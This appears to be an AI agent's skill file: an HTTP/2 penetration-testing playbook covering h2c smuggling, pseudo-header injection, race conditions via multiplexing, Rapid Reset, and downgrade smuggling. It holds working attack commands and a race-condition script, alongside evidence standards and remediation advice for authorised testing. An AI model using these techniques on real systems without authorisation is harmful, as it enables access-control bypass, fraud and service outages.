---
name: http2-specific-attacks
description: >-
  HTTP/2 protocol-specific attack playbook. Use when the target supports HTTP/2 and you need to exploit binary framing, HPACK compression, h2c upgrade smuggling, pseudo-header injection, stream multiplexing abuse, or H2→H1 downgrade translation flaws.
---

# SKILL: HTTP/2 Specific Attacks — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: HTTP/2 protocol-level attack techniques beyond basic request smuggling. Covers h2c smuggling, pseudo-header manipulation, HPACK attacks, single-packet race conditions, and H2→H1 downgrade injection. Base models conflate HTTP/2 smuggling with HTTP/1.1 smuggling — this skill focuses on H2-unique attack surface.

## 0. RELATED ROUTING

- [request-smuggling](../request-smuggling/SKILL.md) — CL.TE/TE.CL/TE.TE fundamentals and H2.CL/H2.TE variants
- [request-smuggling/H2_SMUGGLING_VARIANTS.md](../request-smuggling/H2_SMUGGLING_VARIANTS.md) — byte-level H2.CL/H2.TE payloads, CL.0, client-side desync
- [race-condition](../race-condition/SKILL.md) — single-packet attack leverages H2 multiplexing for race conditions
- [web-cache-deception](../web-cache-deception/SKILL.md) — cache poisoning via H2 smuggled responses

---

## 1. HTTP/2 ATTACK SURFACE OVERVIEW

| Feature | Attack Surface |
|---|---|
| Binary framing | Frame-level manipulation, parser differentials |
| HPACK compression | Compression oracles (CRIME/BREACH), table poisoning |
| Multiplexing | Single-packet race conditions, RST_STREAM flood |
| Server push | Cache poisoning via unsolicited push |
| Pseudo-headers (`:method`/`:path`/`:authority`/`:scheme`) | Injection, request splitting, path discrepancy |

---

## 2. h2c (HTTP/2 CLEARTEXT) SMUGGLING

### 2.1 Concept

h2c is HTTP/2 without TLS, negotiated via the HTTP/1.1 `Upgrade` mechanism. Many reverse proxies forward the `Upgrade: h2c` header without understanding it, allowing attackers to bypass proxy-level access controls.

```
Client ──[Upgrade: h2c]──> Reverse Proxy ──[forwards blindly]──> Backend
                                                                    │
                                                            Backend speaks H2
                                                            Proxy is blind to
                                                            the H2 conversation
```

### 2.2 Attack Flow

```
1. Client sends HTTP/1.1 request with:
   GET / HTTP/1.1
   Host: target.com
   Upgrade: h2c
   HTTP2-Settings: <base64 H2 settings>
   Connection: Upgrade, HTTP2-Settings

2. Proxy forwards request (doesn't understand h2c)
3. Backend responds: HTTP/1.1 101 Switching Protocols
4. Connection is now HTTP/2 between client and backend
5. Proxy is now a TCP tunnel — cannot inspect/filter H2 frames
6. Client sends H2 requests directly to backend, bypassing proxy rules
```

### 2.3 What You Can Bypass

```
✓ Path-based access controls (/admin blocked at proxy → accessible via h2c)
✓ WAF rules (proxy-side WAF can't inspect H2 binary frames)
✓ Rate limiting (proxy-level rate limits bypassed)
✓ Authentication (proxy-enforced auth headers)
✓ IP restrictions (proxy validates source IP, but h2c tunnel bypasses)
```

### 2.4 Tool: h2csmuggler

```bash
# Install
git clone https://github.com/BishopFox/h2csmuggler
cd h2csmuggler
pip3 install h2

# Basic smuggle — access /admin bypassing proxy restrictions
python3 h2csmuggler.py -x https://target.com/ --test

# Smuggle specific path
python3 h2csmuggler.py -x https://target.com/ -X GET -p /admin/users

# With custom headers
python3 h2csmuggler.py -x https://target.com/ -X GET -p /admin \
    -H "Authorization: Bearer token123"
```

### 2.5 Detection

```bash
# Check if backend supports h2c upgrade
curl -v --http1.1 https://target.com/ \
    -H "Upgrade: h2c" \
    -H "HTTP2-Settings: AAMAAABkAAQCAAAAAAIAAAAA" \
    -H "Connection: Upgrade, HTTP2-Settings"

# 101 Switching Protocols → h2c supported
# 200/400/other → h2c not supported or proxy blocks upgrade
```

---

## 3. PSEUDO-HEADER INJECTION

### 3.1 HTTP/2 Pseudo-Headers

HTTP/2 replaces the request line with pseudo-headers (prefixed with `:`):

| Pseudo-Header | HTTP/1.1 Equivalent | Example |
|---|---|---|
| `:method` | Request method | `GET`, `POST` |
| `:path` | Request URI | `/api/users` |
| `:authority` | Host header | `target.com` |
| `:scheme` | Protocol | `https` |

### 3.2 Path Discrepancy Between Proxy and Backend

```
Scenario: Proxy routes based on :path, backend uses different parsing

H2 request:
  :method: GET
  :path: /public/../admin/users
  :authority: target.com

Proxy sees: /public/../admin/users → matches /public/* rule → ALLOWED
Backend normalizes: /admin/users → serves admin content
```

### 3.3 Duplicate Pseudo-Header Injection

HTTP/2 spec forbids duplicate pseudo-headers, but implementation varies:

```
:method: GET
:path: /public
:path: /admin       ← duplicate, forbidden by spec
:authority: target.com

Proxy may use first :path (/public) for routing
Backend may use last :path (/admin) for serving
```

### 3.4 Authority vs Host Disagreement

```
:authority: public.target.com    ← proxy routes based on this
host: admin.internal.target.com  ← backend may prefer Host header

Result: proxy routes to public vhost, backend serves admin vhost
```

### 3.5 Scheme Manipulation

```
:scheme: https
:path: /api/internal
:authority: target.com

If backend trusts :scheme to determine if request is "internal":
  :scheme: https → "external" → restricted
  :scheme: http  → "internal" → unrestricted access
```

---

## 4. HPACK COMPRESSION ATTACKS

### 4.1 CRIME/BREACH on HTTP/2

```
Principle: HPACK compresses headers. If attacker controls part of a header and a secret
exists in the same compression context, matching guesses → smaller frames → oracle.

Limitation: HPACK uses static+dynamic table (not raw DEFLATE), per-connection table,
requires many requests on same connection. Harder than original CRIME.
```

### 4.2 Header Table Poisoning

```
HPACK dynamic table stores recent headers across requests on same connection.
1. Attacker sends X-Custom: malicious-value → added to dynamic table
2. Subsequent requests may reference this entry
3. If CDN/proxy pools connections → attacker and victim share table → cross-request leakage
```

---

## 5. STREAM MULTIPLEXING ABUSE

### 5.1 Single-Packet Attack (Race Conditions)

HTTP/2 multiplexing allows sending multiple requests in a single TCP packet, achieving true simultaneous server-side processing:

```
Traditional race condition: send N requests → network jitter → inconsistent timing
H2 single-packet: pack N requests into one TCP segment → all arrive simultaneously

                    ┌─ Stream 1: POST /transfer (amount=1000)
Single TCP packet ──├─ Stream 3: POST /transfer (amount=1000)
                    ├─ Stream 5: POST /transfer (amount=1000)
                    └─ Stream 7: POST /transfer (amount=1000)
                    
All 4 requests processed at the same nanosecond window
```

```python
# Using h2 library — prepare all requests, send in single write
import h2.connection, h2.config, socket, ssl

ctx = ssl.create_default_context()
ctx.set_alpn_protocols(['h2'])
sock = ctx.wrap_socket(socket.create_connection((host, 443)), server_hostname=host)

conn = h2.connection.H2Connection(config=h2.config.H2Configuration(client_side=True))
conn.initiate_connection()
sock.sendall(conn.data_to_send())

for i in range(20):
    sid = conn.get_next_available_stream_id()
    conn.send_headers(sid, [(':method','POST'),(':path',path),(':authority',host),(':scheme','https')])
    conn.send_data(sid, b'amount=1000', end_stream=True)

sock.sendall(conn.data_to_send())  # ALL frames in single TCP packet
```

### 5.2 RST_STREAM Flood (CVE-2023-44487 "Rapid Reset")

```
Attack: HEADERS (open stream) → RST_STREAM (cancel) → repeat thousands/sec
Server processes each open/close but client doesn't wait for responses
Amplification: minimal client resources → massive server CPU exhaustion
```

### 5.3 PRIORITY Manipulation

```
Set exclusive=true + weight=256 on attacker's stream → starve other users' requests
```

---

## 6. HTTP/2 → HTTP/1.1 DOWNGRADE ISSUES

### 6.1 Header Injection via Binary Format

H2 header values are binary — `\r\n` is valid data within a value. When proxy downgrades to H1, `\r\n` in header value becomes actual line break → header injection.

```
H2: X-Custom: "value\r\nInjected: evil"  → binary, valid
H1: X-Custom: value                      → line break
    Injected: evil                        → new header!
```

### 6.2 Transfer-Encoding Smuggling

H2 spec forbids `transfer-encoding`, but some proxies pass it through during downgrade → backend processes chunked encoding → H2.TE smuggling. See `../request-smuggling/H2_SMUGGLING_VARIANTS.md`.

### 6.3 Content-Length Discrepancy

H2 uses frame length (no CL needed). If proxy generates CL during downgrade but attacker also sent a CL header → conflicting lengths → request smuggling.

### 6.4 Header Name Case

H2 requires lowercase. Sending `Transfer-Encoding` (uppercase) is invalid H2 but some proxies pass it → valid H1 header on backend.

---

## 7. SERVER PUSH CACHE POISONING

```
Attack: trigger server push for /static/app.js with attacker-controlled content
  → PUSH_PROMISE frame pushes malicious response
  → browser/CDN caches poisoned content under legitimate URL
  → all subsequent loads serve attacker's content

Mitigation: most modern browsers/CDNs restrict or disable server push
```

---

## 8. DECISION TREE

```
Target supports HTTP/2?
│
├── YES
│   ├── Does proxy support h2c upgrade?
│   │   ├── YES → h2c smuggling (Section 2)
│   │   │   └── Access restricted paths bypassing proxy rules
│   │   └── NO → Continue
│   │
│   ├── H2→H1 downgrade between proxy and backend?
│   │   ├── YES → Header injection via binary format (Section 6.1)
│   │   │   ├── TE header passthrough? → H2.TE smuggling (Section 6.2)
│   │   │   ├── CL discrepancy? → H2.CL smuggling (Section 6.3)
│   │   │   └── See ../request-smuggling/H2_SMUGGLING_VARIANTS.md
│   │   └── NO (end-to-end H2) → Continue
│   │
│   ├── Need race condition?
│   │   ├── YES → Single-packet attack via multiplexing (Section 5.1)
│   │   │   └── Pack N requests in one TCP segment
│   │   └── NO → Continue
│   │
│   ├── Pseudo-header manipulation viable?
│   │   ├── :path discrepancy → path confusion (Section 3.2)
│   │   ├── :authority vs Host → vhost confusion (Section 3.4)
│   │   └── :scheme manipulation → access control bypass (Section 3.5)
│   │
│   ├── Server push enabled?
│   │   ├── YES → Cache poisoning via push (Section 7)
│   │   └── NO → Continue
│   │
│   └── DoS objective?
│       ├── RST_STREAM rapid reset (Section 5.2)
│       └── PRIORITY starvation (Section 5.3)
│
└── NO (HTTP/1.1 only)
    └── See ../request-smuggling/SKILL.md for H1-specific techniques
```

---

## 9. TOOLS REFERENCE

| Tool | Purpose |
|---|---|
| **h2csmuggler** | h2c upgrade smuggling (github.com/BishopFox/h2csmuggler) |
| **http2smugl** | H2-specific desync testing (github.com/neex/http2smugl) |
| **h2 (Python)** | HTTP/2 protocol lib for frame crafting (github.com/python-hyper/h2) |
| **nghttp2** | H2 client/server tools (nghttp2.org) |
| **Burp HTTP Request Smuggler** | Automated variant scanning |
| **curl --http2** | Quick H2 probing (built-in) |

---

## 10. QUICK REFERENCE

```bash
# h2c probe
curl -v --http1.1 https://target.com/ -H "Upgrade: h2c" -H "Connection: Upgrade, HTTP2-Settings" -H "HTTP2-Settings: AAMAAABkAAQCAAAAAAIAAAAA"

# H2 support check
curl -v --http2 https://target.com/ 2>&1 | grep "ALPN"
```

---

## 11. EXECUTION PRIMITIVES

HTTP/2 findings are proven by **a response the origin or an intermediary produced incorrectly** - a
smuggled request that reached the backend, a request that bypassed a control, or a cache entry with
content you chose. Establishing the protocol support is the first step.

### 11.1 Confirm the server speaks HTTP/2 and which downgrade path exists

```bash
# TLS ALPN negotiation
curl -sS -o /dev/null -w 'http_version=%{http_version}\n' --http2 "https://target.tld/"
# the version the server reports and whether it speaks h2c (cleartext) on an internal port
curl -sS -o /dev/null -w 'http2=%{http_version}\n' -k --http2-prior-knowledge "https://target.tld/"
nmap -Pn -p 80,443,8080,8443 --script http2 --script http-headers target.tld
echo "--- h2c upgrade attempt on a cleartext port"
curl -sS -o /dev/null -w '%{http_code}\n' --http2-prior-knowledge "http://target.tld/"
```

`--http2-prior-knowledge` succeeding without TLS means h2c is enabled, which is an internal-facing
condition that frequently sits behind a proxy that only understands HTTP/1.1. **Record which ports
speak what** - the downgrade boundary is where the findings live.

### 11.2 h2c smuggling: bypass front-end authorization

```bash
# the front-end proxies HTTP/1.1 and forwards the upgrade; the backend accepts h2c directly.
# the technique requires precise framing, so use a raw client rather than a normalising one.
# request sent as HTTP/1.1 with an Upgrade header, carrying a tunnelled h2 request:
cat > /tmp/h2c.req <<'REQ'
GET / HTTP/1.1
Host: target.tld
Connection: Upgrade, HTTP2-Settings
Upgrade: h2c
HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA

REQ
# and the equivalent with a body, so the smuggled request can carry a different path or a header
# the front-end would have blocked
printf '%s' "$(cat /tmp/h2c.req)" | curl -sS --http2-prior-knowledge -o /tmp/h2c.out \
  -w '%{http_code} %{http_version}\n' -X POST --data-binary @- "http://target.tld/"
head -c 200 /tmp/h2c.out
```

The check is whether the response came from the **backend** with a path or header the front-end would
not have permitted. If the front-end terminates h2c, the request is normalised and there is no
smuggling - **record that outcome too**, because it is the control working.

### 11.3 Pseudo-header injection

```bash
# pseudo-headers (":path", ":authority", ":method") are hop-by-hop and must not be forwarded.
# a proxy that forwards a client-supplied :authority gives you host-header control.
# and one that forwards a duplicate pseudo-header gives you a parser disagreement.
# raw h2 frames are required; use a client that lets you set them explicitly (nghttp2):
nghttp -v -H':authority: internal.admin.tld' "https://target.tld/" 2>&1 | head -40
nghttp -v "https://target.tld/" -H':path: /admin' 2>&1 | head -40
echo "--- and the HTTP/1.1 equivalent, which many proxies normalise INTO HTTP/2"
curl -sS -o /tmp/p -w '%{http_code}\n' "https://target.tld/" -H 'Host: internal.admin.tld'
grep -icE 'admin|internal|invalid' /tmp/p
```

A proxy that converts HTTP/1.1 to HTTP/2 and copies a client-supplied `Host` into `:authority` gives you
the same effect as a host-header attack. **A change in routing, vhost, or access decision is the
finding.**

### 11.4 Header-bearing size limits and HPACK behaviour

```bash
# HPACK uses a dynamic table, so a very large header set can be used to probe memory behaviour.
# the practical, safe test is whether the server enforces a header list size at all:
python3 - <<'PY'
import subprocess
hdr=[]
for i in range(200):
    hdr += ["-H", f"X-Pad-{i}: {'A'*400}"]
print("headers:", len(hdr)//2)
PY
# send a large set through a client that supports h2 and note whether the server rejects it
for N in 20 100 200; do
  H=""; for i in $(seq 1 $N); do H="$H -H X-Pad-$i:$(printf 'A%.0s' $(seq 1 300))"; done
  # shellcheck disable=SC2086
  curl -sS -o /dev/null -w "n=$N code=%{http_code}\n" --http2 $H "https://target.tld/"
done
```

This is a **resource-exhaustion** probe, so treat it as such: measure whether the server enforces a
limit. A server that accepts unbounded header lists is a hardening finding, and you should **not**
attempt to exhaust memory on a production system.

### 11.5 Stream multiplexing and connection-level state

```bash
# many concurrent streams on one connection share a flow-control window; test connection reuse
for i in $(seq 1 50); do
  curl -sS -o /dev/null -w "%{http_code}\n" --http2 "https://target.tld/?i=$i" &
done; wait
# and a slow-body stream that holds the connection open while other streams complete
curl -sS -o /dev/null --http2 --limit-rate 1 "https://target.tld/large" &
sleep 2; curl -sS -o /dev/null -w 'concurrent=%{http_code} %{time_total}\n' --http2 "https://target.tld/small"; wait
```

Connection-level state (flow control, stream resets, `GOAWAY`) is where multiplexing bugs live. **Look
for a request that fails or hangs because of another stream** - that is the observable, and it is
usually a denial-of-service-shaped finding, so scope it carefully.

### 11.6 Downgrade boundary: what the front-end validates and the backend does not

```bash
# the classic test: send a request the front-end should reject, in a form the backend still parses
echo "--- content-length and transfer-encoding together (front-end and backend disagree)"
printf 'POST /admin HTTP/1.1\r\nHost: target.tld\r\nContent-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nSMUGGLED' | \
  openssl s_client -quiet -connect target.tld:443 -servername target.tld 2>/dev/null | head -20
echo "--- a request with an invalid pseudo-header order, via a raw h2 client"
nghttp -v -H'method: GET' "https://target.tld/" 2>&1 | head -20
```

A **front-end that accepts and a backend that rejects, or vice versa**, is the parser disagreement.
This overlaps directly with request smuggling - **coordinate with that domain for the framing theory**
and keep the HTTP/2-specific observations here.

### 11.7 Server push and cache poisoning

```bash
# an origin that pushes resources can have its pushes cached by an intermediary
curl -sS -o /dev/null -D- --http2 "https://target.tld/" | grep -iE 'link:|push'
# the cache-key question: does an intermediary cache a pushed response under the requested URL?
curl -sS -o /tmp/g1 --http2 "https://target.tld/pushable.js" -D /tmp/gh1
grep -iE 'cache-control|age|x-cache|cf-cache' /tmp/gh1
sleep 2
curl -sS -o /tmp/g2 --http2 "https://target.tld/pushable.js" -D /tmp/gh2
grep -icE 'x-cache: hit|age: [1-9]' /tmp/gh2
```

If a pushed response lands in a shared cache under a URL that other users request, the push is a
cache-poisoning vector. **The proof is a second, independent request receiving the pushed content** -
coordinate with the cache poisoning domain for the cache-key analysis.

### 11.8 Response-header and connection-header handling

```bash
# connection-specific headers that survive a downgrade are a smuggling/poisoning vector
curl -sS -o /tmp/ch -D- "https://target.tld/" -H 'Connection: keep-alive, X-Inject' -H 'X-Inject: 1'
grep -iE '^connection|^x-inject' /tmp/ch
# and whether an h2 response leaks hop-by-hop headers
nghttp -v "https://target.tld/" 2>&1 | grep -iE 'connection|keep-alive|transfer-encoding' | head
```

Hop-by-hop headers must be stripped when a request crosses a protocol boundary. **One that survives the
downgrade is a finding about the intermediary**, and it tells you which proxy is at the boundary.

---

## 12. CONFIRMING THE FINDING

| Step | Question | What it proves |
|---|---|---|
| 1 | Does the **origin or intermediary** actually speak HTTP/2 on the path you tested? | no protocol, no finding |
| 2 | Did the response come from the **backend**, with a path or header the front-end would reject? | the bypass or the smuggling |
| 3 | Did a **control request** through the normal path get blocked or routed differently? | the boundary is real and you crossed it |
| 4 | Is the discrepancy a **routing, authorization, or caching** change? | severity and audience |
| 5 | Which **component** is at fault - the front-end, the backend, or the downgrade? | the fix owner |
| 6 | Is the effect **reproducible on a second attempt**, or a one-off? | statefulness matters in protocol findings |
| 7 | For a resource-exhaustion claim, was a **limit actually absent**, measured safely? | a limit that exists means no finding |

**The differential is the finding.** Two components disagreeing about the same request - with a control
showing the intended behaviour - is the whole evidence base. A single odd response is not enough.

---

## 13. EVIDENCE STANDARD

| Item | Why |
|---|---|
| The **raw bytes of the request**, with framing preserved (h2 frames or the exact HTTP/1.1 text) | normalising clients destroy the evidence; capture the wire form |
| The **response**, including which component produced it where the headers reveal it | proves the effect and localises the boundary |
| The **blocked or normal control** through the standard path | establishes that a control exists and was bypassed |
| The **protocol and port** for each side of the boundary | "the front-end speaks h2 on 443, the backend speaks h2c on 8080" is the finding's shape |
| The **component identification** - front-end, backend, and their versions if obtainable | the fix owner |
| For cache effects: the **first request**, the **second independent request**, and the cache headers | a cache finding needs both halves |
| **Negative control** - the same request without the technique behaves normally | isolates the technique as the cause |
| A statement of the **impact class** (bypass, smuggling, poisoning, exhaustion) | framework for the reader |
| Confirmation that no **denial of service** was caused while measuring limits | scope discipline |
| The **tool versions** used, since raw h2 behaviour is tool-sensitive | reproducibility |

Report the **raw request, the control, and the differential**: "the edge proxy on 443 terminates
HTTP/2 and forwards HTTP/1.1, while the origin on 8080 accepts h2c prior-knowledge connections;
`GET /admin` through the proxy returns `403`, and the same request sent as an h2c prior-knowledge
connection to the origin returns `200` with the admin page, proving the authorization control exists
only at the edge; the origin's `Server` header identifies it as a version with h2c enabled by
default", never "the server is vulnerable to HTTP/2 attacks".

### False positives - do not report these

| Observation | Why it is not a finding |
|---|---|
| The server negotiates HTTP/2 normally with no anomaly | the protocol working is not a finding |
| A malformed-frame error response | errors are not findings |
| A differential with no control showing the intended behaviour | nothing was bypassed |
| h2c that the front-end terminates and normalises | the control works |
| A header-list probe that the server rejected with `431` | the limit is enforced |
| A connection reset under load with no reproducible trigger | unproven |
| A timing difference within normal variance | measure repeatedly |
| A cache hit on content that was correctly cached for that URL | normal caching |
| A push that no intermediary caches | no poisoning |
| A `:authority` value the backend ignored | no host-header effect |
| An unnormalised request that no real client can produce | not deliverable |
| A denial of service you caused on a production system | an incident, not a finding |

**Capture the wire.** If your client normalised the request, you have no evidence.

---

## 14. REMEDIATION REFERENCE

1. **Terminate and re-originate HTTP/2 at the edge, so the backend never accepts a client upgrade** - h2c smuggling depends on the backend accepting a protocol the front-end did not validate, and disabling h2c upstream removes it entirely.
2. **Disable h2c (cleartext HTTP/2) on internal listeners unless it is genuinely required** - the attacks that matter are all internal-facing, and TLS-only HTTP/2 is usually sufficient.
3. **Strip and regenerate hop-by-hop headers at every protocol boundary** - `Connection`, `Upgrade`, `HTTP2-Settings`, `Keep-Alive`, `Transfer-Encoding`, and `TE` must not cross the downgrade.
4. **Never forward client-supplied pseudo-headers** - `:authority`, `:path`, `:method`, and `:scheme` must be derived from the request the edge validated, not copied from the client.
5. **Enforce header-list and header-count limits at the edge** - HPACK makes large header sets cheap for the client and expensive for the server, so a size limit is the control for that exhaustion path.
6. **Set explicit stream, connection, and flow-control limits** - `SETTINGS_MAX_CONCURRENT_STREAMS`, a per-connection window, and idle timeouts prevent one connection from monopolising a backend worker.
7. **Normalise requests before caching, and never cache a pushed response under a different URL** - server push and cache interaction is the poisoning path, and a strict cache key plus push policy closes it.
8. **Validate the request once, at the edge, and re-originate a normalised HTTP/1.1 request upstream** - the recurring root cause is validation at one layer and use at another, so make one layer authoritative.
9. **Keep the proxy, server, and HTTP/2 library patched** - most published HTTP/2 issues are version-specific library bugs, so the version is the fix in a large fraction of cases.
10. **Log and alert on protocol anomalies** - a request with both `Content-Length` and `Transfer-Encoding`, or a client-supplied `:authority`, is never legitimate traffic.
11. **Test the h2 and h2c paths as part of the edge configuration review** - a deployment whose front-end and back-end protocol sets differ needs that boundary explicitly tested, not assumed.

---

## 15. RELATED SIBLINGS - LOAD TOGETHER

- [request-smuggling](../request-smuggling/SKILL.md) - the framing and parser-disagreement theory this shares
- [http-host-header-attacks](../http-host-header-attacks/SKILL.md) - the `:authority` effect in HTTP/1.1 terms
- [web-cache-deception](../web-cache-deception/SKILL.md) - the cache-key analysis for push and poisoning
- [attack-cache-poison](../attack-cache-poison/SKILL.md) - the poisoning playbook
- [http-parameter-pollution](../http-parameter-pollution/SKILL.md) - the other parser-disagreement class
